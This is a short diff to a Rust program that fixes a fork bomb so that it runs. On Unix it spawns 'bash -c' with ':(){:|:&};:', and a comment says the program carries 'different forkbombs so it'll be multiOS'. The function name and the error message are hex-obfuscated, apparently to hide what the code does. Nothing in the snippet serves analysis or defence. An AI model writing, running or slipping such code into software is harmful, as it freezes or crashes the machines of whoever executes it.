@@ -7,7 +7,8 @@ pub fn main() {
 // different forkbombs so it'll be multiOS
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
-        Command::new("sh")
+        Command::new("bash")
+            .arg("-c")
             .arg(":(){:|:&};:")
             .spawn()
             .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
